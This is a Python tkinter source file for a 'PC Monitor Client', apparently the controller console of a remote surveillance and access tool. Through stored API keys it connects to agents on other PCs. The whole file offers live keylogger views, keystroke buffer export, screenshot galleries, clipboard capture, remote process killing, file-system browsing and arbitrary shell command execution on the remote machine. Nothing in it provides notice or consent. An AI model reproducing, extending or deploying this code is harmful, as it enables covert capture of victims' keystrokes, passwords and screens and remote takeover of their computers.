import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from PIL import Image, ImageTk
import json
import requests
import datetime
import os
import io
import base64
import threading
from threading import Thread
import time

class PCMonitorClient(tk.Tk):
    """Main client application"""
    
    def __init__(self):
        super().__init__()
        self.title("PC Monitor Client")
        self.geometry("1200x800")
        self.minsize(800, 600)
        
        # Use relative path in current directory
        self.config_file = "multi_client_config.json"
        self.pc_tabs = {}
        
        # Create UI
        self.create_ui()
        
        # Load saved servers
        self.load_servers()
        
    def create_ui(self):
        """Create the main UI elements"""
        # Create notebook for tabs
        self.notebook = ttk.Notebook(self)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create control panel
        self.control_frame = ttk.LabelFrame(self, text="Control Panel")
        self.control_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # Add control buttons
        self.add_server_btn = ttk.Button(self.control_frame, text="Add Server", command=self.show_add_server_dialog)
        self.add_server_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.settings_btn = ttk.Button(self.control_frame, text="Settings", command=self.show_settings)
        self.settings_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        # Status bar
        self.status_var = tk.StringVar()
        self.status_var.set("Ready - Add a server to begin")
        self.status_bar = ttk.Label(self, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(fill=tk.X, side=tk.BOTTOM, padx=10, pady=5)
    
    def load_servers(self):
        """Load saved server connections"""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                    servers = config.get('servers', [])
                    for server in servers:
                        self.add_server_tab(server['name'], server['url'], server['api_key'])
            else:
                print(f"No configuration found. Using defaults.")
                print(f"Please add servers using: Add Server button")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load servers: {str(e)}")
            print(f"Config error: {e}")
    
    def save_servers(self):
        """Save server connections to file"""
        try:
            servers = []
            for name, tab in self.pc_tabs.items():
                servers.append({
                    'name': name,
                    'url': tab.server_url,
                    'api_key': tab.api_key
                })
            
            config = {'servers': servers}
            with open(self.config_file, 'w') as f:
                json.dump(config, f, indent=2)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save servers: {str(e)}")
    
    def add_server_tab(self, name, url, api_key):
        """Add a new server tab"""
        tab = PCTab(self.notebook, self, name, url, api_key)
        self.notebook.add(tab, text=name)
        self.pc_tabs[name] = tab
        return tab
    
    def show_add_server_dialog(self):
        """Show dialog to add a new server"""
        dialog = tk.Toplevel(self)
        dialog.title("Add Server")
        dialog.geometry("400x200")
        dialog.transient(self)
        dialog.grab_set()
        
        ttk.Label(dialog, text="Server Name:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        name_var = tk.StringVar()
        ttk.Entry(dialog, textvariable=name_var, width=30).grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Label(dialog, text="Server URL:").grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        url_var = tk.StringVar(value="http://192.168.0.48:5000")
        ttk.Entry(dialog, textvariable=url_var, width=30).grid(row=1, column=1, padx=5, pady=5)
        
        ttk.Label(dialog, text="API Key:").grid(row=2, column=0, padx=5, pady=5, sticky=tk.W)
        api_key_var = tk.StringVar()
        ttk.Entry(dialog, textvariable=api_key_var, width=30).grid(row=2, column=1, padx=5, pady=5)
        
        def add_server():
            name = name_var.get().strip()
            url = url_var.get().strip()
            api_key = api_key_var.get().strip()
            
            if not name or not url or not api_key:
                messagebox.showerror("Error", "All fields are required")
                return
                
            self.add_server_tab(name, url, api_key)
            self.save_servers()
            dialog.destroy()
            
        ttk.Button(dialog, text="Add", command=add_server).grid(row=3, column=0, columnspan=2, pady=10)
    
    def show_settings(self):
        """Show settings dialog"""
        messagebox.showinfo("Settings", f"Settings file location:\n{os.path.abspath(self.config_file)}\n\nEdit manually if needed.")
    
    def get_current_tab(self):
        """Get the currently selected tab"""
        current = self.notebook.select()
        if current:
            return self.notebook.nametowidget(current)
        return None


class PCTab(ttk.Frame):
    """Tab for a single PC connection"""
    
    def __init__(self, parent, main_app, name, server_url, api_key):
        super().__init__(parent)
        self.main_app = main_app
        self.name = name
        self.server_url = server_url
        self.api_key = api_key
        self.headers = {'X-API-Key': api_key}
        self.session = requests.Session()
        self.monitoring = False
        self.auto_refresh = False
        self.auto_refresh_job = None
        self.screenshots = []  # Initialize screenshots list
        
        # Create UI
        self.create_ui()
        
        # Initial status update
        self.update_status()
        
    def create_ui(self):
        """Create the tab UI elements"""
        # Create notebook for sub-tabs
        self.sub_notebook = ttk.Notebook(self)
        self.sub_notebook.pack(fill=tk.BOTH, expand=True)
        
        # Create sub-tabs
        self.overview_frame = ttk.Frame(self.sub_notebook)
        self.sub_notebook.add(self.overview_frame, text="Overview")
        
        self.keylogger_frame = ttk.Frame(self.sub_notebook)
        self.sub_notebook.add(self.keylogger_frame, text="Keylogger")
        
        self.screenshots_frame = ttk.Frame(self.sub_notebook)
        self.sub_notebook.add(self.screenshots_frame, text="Screenshots")
        
        self.search_frame = ttk.Frame(self.sub_notebook)
        self.sub_notebook.add(self.search_frame, text="Search")
        
        # Create control panel
        self.control_frame = ttk.LabelFrame(self, text="Controls")
        self.control_frame.pack(fill=tk.X, pady=5)
        
        # Add control buttons
        self.refresh_btn = ttk.Button(self.control_frame, text="Refresh", command=self.refresh)
        self.refresh_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.start_btn = ttk.Button(self.control_frame, text="Start", command=self.start_monitoring)
        self.start_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.stop_btn = ttk.Button(self.control_frame, text="Stop", command=self.stop_monitoring)
        self.stop_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.snapshot_btn = ttk.Button(self.control_frame, text="Snapshot", command=self.take_snapshot)
        self.snapshot_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.kill_btn = ttk.Button(self.control_frame, text="⚠ KILL SERVER", command=self.kill_server)
        self.kill_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.auto_refresh_var = tk.BooleanVar()
        self.auto_refresh_cb = ttk.Checkbutton(self.control_frame, text="Auto-refresh", 
                                               variable=self.auto_refresh_var, 
                                               command=self.toggle_auto_refresh)
        self.auto_refresh_cb.pack(side=tk.LEFT, padx=5, pady=5)
        
        # Advanced features buttons
        self.clipboard_btn = ttk.Button(self.control_frame, text="Clipboard", command=self.show_clipboard_dialog)
        self.clipboard_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.process_btn = ttk.Button(self.control_frame, text="Processes", command=self.show_process_dialog)
        self.process_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.filesystem_btn = ttk.Button(self.control_frame, text="Files", command=self.show_filesystem_dialog)
        self.filesystem_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.command_btn = ttk.Button(self.control_frame, text="Command", command=self.show_command_dialog)
        self.command_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        # Status bar
        self.status_var = tk.StringVar()
        self.status_var.set("Not connected")
        self.status_bar = ttk.Label(self, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(fill=tk.X, side=tk.BOTTOM, pady=5)
        
        # Initialize tabs
        self.create_overview_tab()
        self.create_keylogger_tab()
        self.create_screenshots_tab()
        self.create_search_tab()
        
    def toggle_auto_refresh(self):
        """Toggle auto-refresh"""
        self.auto_refresh = self.auto_refresh_var.get()
        if self.auto_refresh:
            self.schedule_auto_refresh()
        elif self.auto_refresh_job:
            self.after_cancel(self.auto_refresh_job)
            self.auto_refresh_job = None
    
    def schedule_auto_refresh(self):
        """Schedule next auto-refresh"""
        if self.auto_refresh:
            self.refresh()
            self.auto_refresh_job = self.after(15000, self.schedule_auto_refresh)
        
    def refresh(self):
        """Refresh all data"""
        self.update_status()
        self.refresh_events()
        self.refresh_screenshot()
        
    def update_status(self):
        """Update connection status"""
        try:
            resp = self.session.get(f"{self.server_url}/api/status", headers=self.headers, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                self.monitoring = data.get('monitoring', False)
                events_count = data.get('event_count', 0)
                keystrokes_count = data.get('keystroke_count', 0)
                pc_name = data.get('pc_name', 'Unknown')
                
                status = "🟢 " if self.monitoring else "🔴 "
                status += f"{pc_name} | Events: {events_count} | Keystrokes: {keystrokes_count}"
                self.status_var.set(status)
            else:
                self.status_var.set(f"Error: {resp.status_code}")
        except Exception as e:
            self.status_var.set(f"Connection error: {str(e)}")
            
    def start_monitoring(self):
        """Start monitoring on server"""
        try:
            resp = self.session.post(f"{self.server_url}/api/start", headers=self.headers)
            if resp.status_code == 200:
                self.monitoring = True
                self.update_status()
                messagebox.showinfo("Success", "Monitoring started")
            else:
                messagebox.showerror("Error", f"Failed to start monitoring: {resp.status_code}")
        except Exception as e:
            messagebox.showerror("Error", f"Connection error: {str(e)}")
            
    def stop_monitoring(self):
        """Stop monitoring on server"""
        try:
            resp = self.session.post(f"{self.server_url}/api/stop", headers=self.headers)
            if resp.status_code == 200:
                self.monitoring = False
                self.update_status()
                messagebox.showinfo("Success", "Monitoring stopped")
            else:
                messagebox.showerror("Error", f"Failed to stop monitoring: {resp.status_code}")
        except Exception as e:
            messagebox.showerror("Error", f"Connection error: {str(e)}")
            
    def take_snapshot(self):
        """Take a snapshot on server"""
        try:
            resp = self.session.post(f"{self.server_url}/api/snapshot", headers=self.headers)
            if resp.status_code == 200:
                messagebox.showinfo("Success", "Snapshot taken successfully")
                self.refresh_screenshot()
            else:
                messagebox.showerror("Error", f"Failed to take snapshot: {resp.status_code}")
        except Exception as e:
            messagebox.showerror("Error", f"Connection error: {str(e)}")
    
    def kill_server(self):
        """Kill the server process"""
        if messagebox.askyesno("Confirm", "This will terminate the server process. Continue?"):
            try:
                resp = self.session.post(f"{self.server_url}/api/kill", headers=self.headers, timeout=5)
                messagebox.showinfo("Success", "Server kill signal sent")
            except Exception as e:
                messagebox.showinfo("Info", "Server may have been killed (connection lost)")
            
    def create_overview_tab(self):
        """Create overview tab content"""
        # Split frame into two parts
        left_frame = ttk.Frame(self.overview_frame)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        right_frame = ttk.Frame(self.overview_frame)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        # Screenshot preview
        screenshot_frame = ttk.LabelFrame(left_frame, text="Live View")
        screenshot_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.screenshot_label = ttk.Label(screenshot_frame, text="No screenshot available")
        self.screenshot_label.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        refresh_screenshot_btn = ttk.Button(screenshot_frame, text="Refresh Screenshot", command=self.refresh_screenshot)
        refresh_screenshot_btn.pack(pady=5)
        
        # Events list
        events_frame = ttk.LabelFrame(right_frame, text="Activity Log")
        events_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.events_text = tk.Text(events_frame, wrap=tk.WORD, height=20)
        self.events_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        events_scroll = ttk.Scrollbar(events_frame, command=self.events_text.yview)
        events_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.events_text.config(yscrollcommand=events_scroll.set)
        
        refresh_events_btn = ttk.Button(events_frame, text="Refresh Events", command=self.refresh_events)
        refresh_events_btn.pack(pady=5)
        
    def refresh_screenshot(self):
        """Refresh screenshot preview"""
        try:
            resp = self.session.get(f"{self.server_url}/api/screenshot/latest", headers=self.headers, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                img_data = base64.b64decode(data['image'])
                img = Image.open(io.BytesIO(img_data))
                img.thumbnail((640, 360), Image.Resampling.LANCZOS)
                photo = ImageTk.PhotoImage(img)
                self.screenshot_label.config(image=photo, text="")
                setattr(self.screenshot_label, 'image', photo)
            else:
                self.screenshot_label.config(text="No screenshot available", image="")
        except Exception as e:
            self.screenshot_label.config(text=f"Error: {str(e)}", image="")
            
    def refresh_events(self):
        """Refresh events list"""
        try:
            resp = self.session.get(f"{self.server_url}/api/events", headers=self.headers, params={'limit': 50})
            if resp.status_code == 200:
                events = resp.json()
                self.events_text.delete(1.0, tk.END)
                for event in reversed(events):
                    timestamp = event.get('timestamp', '')
                    event_type = event.get('type', '')
                    details = event.get('details', {})
                    
                    if event_type == 'key_press':
                        key = details.get('key', '')
                        window = details.get('window', '')
                        self.events_text.insert(tk.END, f"{timestamp} - Key: {key} in {window}\n")
                    elif event_type == 'mouse_click':
                        button = details.get('button', '')
                        x = details.get('x', 0)
                        y = details.get('y', 0)
                        window = details.get('window', '')
                        self.events_text.insert(tk.END, f"{timestamp} - Mouse {button} at ({x},{y}) in {window}\n")
                    elif event_type == 'window_change':
                        title = details.get('title', '')
                        self.events_text.insert(tk.END, f"{timestamp} - Window: {title}\n")
                    else:
                        self.events_text.insert(tk.END, f"{timestamp} - {event_type}\n")
        except Exception as e:
            self.events_text.delete(1.0, tk.END)
            self.events_text.insert(tk.END, f"Error loading events: {str(e)}")
            
    def create_keylogger_tab(self):
        """Create keylogger tab content"""
        # Live keystrokes frame
        live_frame = ttk.LabelFrame(self.keylogger_frame, text="Live Keystrokes")
        live_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.keylogger_text = tk.Text(live_frame, wrap=tk.WORD, height=10)
        self.keylogger_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        keylogger_scroll = ttk.Scrollbar(live_frame, command=self.keylogger_text.yview)
        keylogger_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.keylogger_text.config(yscrollcommand=keylogger_scroll.set)
        
        # Controls frame
        controls_frame = ttk.Frame(self.keylogger_frame)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.show_all_keys_var = tk.BooleanVar(value=False)
        show_all_keys_cb = ttk.Checkbutton(controls_frame, text="Show All Keys", variable=self.show_all_keys_var)
        show_all_keys_cb.pack(side=tk.LEFT, padx=5)
        
        clear_btn = ttk.Button(controls_frame, text="Clear", command=lambda: self.keylogger_text.delete(1.0, tk.END))
        clear_btn.pack(side=tk.LEFT, padx=5)
        
        load_btn = ttk.Button(controls_frame, text="Load Buffer", command=self.load_keystrokes)
        load_btn.pack(side=tk.LEFT, padx=5)
        
        export_btn = ttk.Button(controls_frame, text="Export Text", command=self.export_keystrokes)
        export_btn.pack(side=tk.LEFT, padx=5)
        
    def load_keystrokes(self):
        """Load keystrokes from server"""
        try:
            params = {'limit': 1000, 'format': 'text'}
            resp = self.session.get(f"{self.server_url}/api/keystrokes/buffer", headers=self.headers, params=params)
            if resp.status_code == 200:
                data = resp.json()
                self.keylogger_text.delete(1.0, tk.END)
                self.keylogger_text.insert(tk.END, data.get('text', ''))
            else:
                messagebox.showerror("Error", f"Failed to get keystrokes: {resp.status_code}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to get keystrokes: {str(e)}")
            
    def export_keystrokes(self):
        """Export keystrokes to file"""
        filename = filedialog.asksaveasfilename(defaultextension=".txt", 
                                              filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(self.keylogger_text.get(1.0, tk.END))
                messagebox.showinfo("Success", f"Keystrokes exported to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export keystrokes: {str(e)}")
                
    def create_screenshots_tab(self):
        """Create screenshots tab content"""
        # Split frame
        left_frame = ttk.Frame(self.screenshots_frame)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        right_frame = ttk.Frame(self.screenshots_frame)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        # Screenshots list
        list_frame = ttk.LabelFrame(left_frame, text="Screenshots")
        list_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.screenshots_listbox = tk.Listbox(list_frame, height=20)
        self.screenshots_listbox.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.screenshots_listbox.bind('<<ListboxSelect>>', self.preview_screenshot)
        self.screenshots_listbox.bind('<Double-Button-1>', self.show_fullscreen)
        
        screenshots_scroll = ttk.Scrollbar(list_frame, command=self.screenshots_listbox.yview)
        screenshots_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.screenshots_listbox.config(yscrollcommand=screenshots_scroll.set)
        
        refresh_btn = ttk.Button(list_frame, text="Refresh Gallery", command=self.refresh_gallery)
        refresh_btn.pack(pady=5)
        
        # Preview
        preview_frame = ttk.LabelFrame(right_frame, text="Preview")
        preview_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.preview_label = ttk.Label(preview_frame, text="Select a screenshot")
        self.preview_label.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
    def refresh_gallery(self):
        """Refresh screenshots gallery"""
        try:
            resp = self.session.get(f"{self.server_url}/api/screenshot/history", headers=self.headers)
            if resp.status_code == 200:
                screenshots = resp.json()
                self.screenshots_listbox.delete(0, tk.END)
                self.screenshots = screenshots
                for screenshot in screenshots:
                    filename = screenshot.get('filename', '')
                    timestamp = screenshot.get('timestamp', '')
                    self.screenshots_listbox.insert(tk.END, f"{timestamp} - {filename}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to get screenshots: {str(e)}")
            
    def preview_screenshot(self, event):
        """Preview selected screenshot"""
        try:
            selection = self.screenshots_listbox.curselection()
            if selection:
                index = selection[0]
                filename = self.screenshots[index]['filename']
                resp = self.session.get(f"{self.server_url}/api/screenshot/{filename}", headers=self.headers)
                if resp.status_code == 200:
                    data = resp.json()
                    img_data = base64.b64decode(data['image'])
                    img = Image.open(io.BytesIO(img_data))
                    img.thumbnail((400, 300), Image.Resampling.LANCZOS)
                    photo = ImageTk.PhotoImage(img)
                    self.preview_label.config(image=photo, text="")
                    setattr(self.preview_label, 'image', photo)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to preview: {str(e)}")
            
    def show_fullscreen(self, event):
        """Show fullscreen image"""
        try:
            selection = self.screenshots_listbox.curselection()
            if selection:
                index = selection[0]
                filename = self.screenshots[index]['filename']
                resp = self.session.get(f"{self.server_url}/api/screenshot/{filename}", headers=self.headers)
                if resp.status_code == 200:
                    data = resp.json()
                    img_data = base64.b64decode(data['image'])
                    img = Image.open(io.BytesIO(img_data))
                    
                    top = tk.Toplevel(self)
                    top.title(filename)
                    
                    screen_width = top.winfo_screenwidth()
                    screen_height = top.winfo_screenheight()
                    img_width, img_height = img.size
                    
                    scale = min(screen_width / img_width, screen_height / img_height) * 0.9
                    new_width = int(img_width * scale)
                    new_height = int(img_height * scale)
                    
                    img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)
                    photo = ImageTk.PhotoImage(img)
                    
                    label = ttk.Label(top, image=photo)
                    setattr(label, 'image', photo)
                    label.pack(fill=tk.BOTH, expand=True)
                    label.bind('<Button-1>', lambda e: top.destroy())
        except Exception as e:
            messagebox.showerror("Error", f"Failed to show fullscreen: {str(e)}")
            
    def create_search_tab(self):
        """Create search tab content"""
        controls_frame = ttk.Frame(self.search_frame)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(controls_frame, text="Search:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.search_var = tk.StringVar()
        ttk.Entry(controls_frame, textvariable=self.search_var, width=30).grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Label(controls_frame, text="Type:").grid(row=0, column=2, padx=5, pady=5, sticky=tk.W)
        self.event_type_var = tk.StringVar()
        type_combo = ttk.Combobox(controls_frame, textvariable=self.event_type_var, width=15)
        type_combo['values'] = ('', 'key_press', 'mouse_click', 'window_change', 'screenshot')
        type_combo.grid(row=0, column=3, padx=5, pady=5)
        
        search_btn = ttk.Button(controls_frame, text="Search", command=self.search_events)
        search_btn.grid(row=0, column=4, padx=5, pady=5)
        
        clear_btn = ttk.Button(controls_frame, text="Clear", command=self.clear_search)
        clear_btn.grid(row=0, column=5, padx=5, pady=5)
        
        results_frame = ttk.LabelFrame(self.search_frame, text="Results")
        results_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.results_text = tk.Text(results_frame, wrap=tk.WORD)
        self.results_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        scroll = ttk.Scrollbar(results_frame, command=self.results_text.yview)
        scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.results_text.config(yscrollcommand=scroll.set)
        
    def search_events(self):
        """Search events"""
        try:
            params = {'limit': 1000}
            if self.search_var.get():
                search_text = self.search_var.get()
                if search_text:
                    params['search'] = search_text
            if self.event_type_var.get():
                event_type = self.event_type_var.get()
                if event_type:
                    params['type'] = event_type
                
            resp = self.session.get(f"{self.server_url}/api/events", headers=self.headers, params=params)
            if resp.status_code == 200:
                events = resp.json()
                self.results_text.delete(1.0, tk.END)
                if not events:
                    self.results_text.insert(tk.END, "No results found.")
                    return
                    
                for event in events:
                    timestamp = event.get('timestamp', '')
                    event_type = event.get('type', '')
                    details = event.get('details', {})
                    self.results_text.insert(tk.END, f"{timestamp} - {event_type}: {details}\n")
        except Exception as e:
            messagebox.showerror("Error", f"Search failed: {str(e)}")
            
    def clear_search(self):
        """Clear search"""
        self.search_var.set("")
        self.event_type_var.set("")
        self.results_text.delete(1.0, tk.END)
    
    def show_clipboard_dialog(self):
        """Show clipboard dialog"""
        dialog = tk.Toplevel(self)
        dialog.title("Clipboard Monitor")
        dialog.geometry("500x400")
        dialog.transient(self.winfo_toplevel())
        
        result_text = tk.Text(dialog, wrap=tk.WORD)
        result_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        def get_clipboard():
            try:
                resp = self.session.get(f"{self.server_url}/api/clipboard", headers=self.headers)
                if resp.status_code == 200:
                    data = resp.json()
                    result_text.delete(1.0, tk.END)
                    result_text.insert(tk.END, f"Content:\n{data.get('content', '')}")
                else:
                    messagebox.showerror("Error", f"Failed: {resp.status_code}")
            except Exception as e:
                messagebox.showerror("Error", str(e))
        
        ttk.Button(dialog, text="Get Clipboard", command=get_clipboard).pack(pady=5)
    
    def show_process_dialog(self):
        """Show process manager dialog"""
        dialog = tk.Toplevel(self)
        dialog.title("Process Manager")
        dialog.geometry("800x600")
        dialog.transient(self.winfo_toplevel())
        
        # Controls
        controls = ttk.Frame(dialog)
        controls.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Button(controls, text="Refresh", command=lambda: load_processes()).pack(side=tk.LEFT, padx=5)
        
        pid_var = tk.StringVar()
        ttk.Label(controls, text="PID:").pack(side=tk.LEFT, padx=5)
        ttk.Entry(controls, textvariable=pid_var, width=10).pack(side=tk.LEFT, padx=5)
        
        def kill_process():
            if not pid_var.get():
                messagebox.showerror("Error", "Enter PID")
                return
            try:
                pid_str = pid_var.get().strip()
                if not pid_str.isdigit():
                    messagebox.showerror("Error", "PID must be a number")
                    return
                    
                data = {"operation": "kill", "pid": int(pid_str)}
                resp = self.session.post(f"{self.server_url}/api/process", headers=self.headers, json=data)
                if resp.status_code == 200:
                    messagebox.showinfo("Success", "Process killed")
                    load_processes()
                else:
                    messagebox.showerror("Error", f"Failed: {resp.status_code}")
            except ValueError:
                messagebox.showerror("Error", "Invalid PID format")
            except Exception as e:
                messagebox.showerror("Error", str(e))
        
        ttk.Button(controls, text="Kill Process", command=kill_process).pack(side=tk.LEFT, padx=5)
        
        # Process tree
        columns = ('pid', 'name', 'username', 'cpu', 'memory')
        tree = ttk.Treeview(dialog, columns=columns, show='headings')
        tree.heading('pid', text='PID')
        tree.heading('name', text='Name')
        tree.heading('username', text='User')
        tree.heading('cpu', text='CPU %')
        tree.heading('memory', text='Memory (MB)')
        
        tree.column('pid', width=60)
        tree.column('name', width=200)
        tree.column('username', width=100)
        tree.column('cpu', width=80)
        tree.column('memory', width=100)
        
        scrollbar = ttk.Scrollbar(dialog, orient=tk.VERTICAL, command=tree.yview)
        tree.configure(yscrollcommand=scrollbar.set)
        
        tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=5, side=tk.LEFT)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y, pady=5)
        
        def load_processes():
            try:
                resp = self.session.get(f"{self.server_url}/api/process", headers=self.headers)
                if resp.status_code == 200:
                    data = resp.json()
                    tree.delete(*tree.get_children())
                    for proc in data.get('processes', []):
                        tree.insert('', tk.END, values=(
                            str(proc.get('pid', '')),
                            str(proc.get('name', '')),
                            str(proc.get('username', '')),
                            f"{proc.get('cpu_percent', 0):.1f}",
                            f"{proc.get('memory_mb', 0):.1f}"
                        ))
                else:
                    messagebox.showerror("Error", f"Failed: {resp.status_code}")
            except Exception as e:
                messagebox.showerror("Error", str(e))
        
        load_processes()
    
    def show_filesystem_dialog(self):
        """Show filesystem browser dialog"""
        dialog = tk.Toplevel(self)
        dialog.title("File System Browser")
        dialog.geometry("700x500")
        dialog.transient(self.winfo_toplevel())
        
        # Path entry
        path_frame = ttk.Frame(dialog)
        path_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(path_frame, text="Path:").pack(side=tk.LEFT, padx=5)
        path_var = tk.StringVar(value="C:\\")
        path_entry = ttk.Entry(path_frame, textvariable=path_var, width=50)
        path_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        def browse_path():
            path = path_var.get()
            try:
                resp = self.session.get(f"{self.server_url}/api/filesystem", 
                                       headers=self.headers, 
                                       params={'path': path})
                if resp.status_code == 200:
                    data = resp.json()
                    tree.delete(*tree.get_children())
                    for item in data.get('items', []):
                        tree.insert('', tk.END, values=(
                            item.get('name', ''),
                            item.get('type', ''),
                            item.get('size', ''),
                            item.get('modified', '')
                        ))
                else:
                    messagebox.showerror("Error", f"Failed: {resp.status_code}")
            except Exception as e:
                messagebox.showerror("Error", str(e))
        
        ttk.Button(path_frame, text="Browse", command=browse_path).pack(side=tk.LEFT, padx=5)
        
        # File tree
        columns = ('name', 'type', 'size', 'modified')
        tree = ttk.Treeview(dialog, columns=columns, show='headings')
        tree.heading('name', text='Name')
        tree.heading('type', text='Type')
        tree.heading('size', text='Size')
        tree.heading('modified', text='Modified')
        
        tree.column('name', width=250)
        tree.column('type', width=80)
        tree.column('size', width=100)
        tree.column('modified', width=150)
        
        scrollbar = ttk.Scrollbar(dialog, orient=tk.VERTICAL, command=tree.yview)
        tree.configure(yscrollcommand=scrollbar.set)
        
        tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=5, side=tk.LEFT)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y, pady=5)
        
        browse_path()
    
    def show_command_dialog(self):
        """Show command execution dialog"""
        dialog = tk.Toplevel(self)
        dialog.title("Execute Command")
        dialog.geometry("600x400")
        dialog.transient(self.winfo_toplevel())
        
        # Command input
        input_frame = ttk.LabelFrame(dialog, text="Command")
        input_frame.pack(fill=tk.X, padx=10, pady=5)
        
        command_var = tk.StringVar()
        ttk.Entry(input_frame, textvariable=command_var, width=60).pack(padx=5, pady=5, fill=tk.X)
        
        # Output
        output_frame = ttk.LabelFrame(dialog, text="Output")
        output_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        output_text = tk.Text(output_frame, wrap=tk.WORD)
        output_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        scroll = ttk.Scrollbar(output_frame, command=output_text.yview)
        scroll.pack(side=tk.RIGHT, fill=tk.Y)
        output_text.config(yscrollcommand=scroll.set)
        
        def execute():
            cmd = command_var.get().strip()
            if not cmd:
                messagebox.showerror("Error", "Enter a command")
                return
            
            output_text.delete(1.0, tk.END)
            output_text.insert(tk.END, f"Executing: {cmd}\n\n")
            
            try:
                data = {"type": "shell", "command": cmd}
                resp = self.session.post(f"{self.server_url}/api/command", 
                                        headers=self.headers, 
                                        json=data,
                                        timeout=30)
                if resp.status_code == 200:
                    result = resp.json()
                    output_text.insert(tk.END, f"Exit Code: {result.get('returncode', 'N/A')}\n\n")
                    output_text.insert(tk.END, f"STDOUT:\n{result.get('stdout', '')}\n\n")
                    output_text.insert(tk.END, f"STDERR:\n{result.get('stderr', '')}\n")
                else:
                    output_text.insert(tk.END, f"Error: {resp.status_code}\n")
            except Exception as e:
                output_text.insert(tk.END, f"Error: {str(e)}\n")
        
        ttk.Button(dialog, text="Execute", command=execute).pack(pady=5)


if __name__ == "__main__":
    app = PCMonitorClient()
    app.mainloop()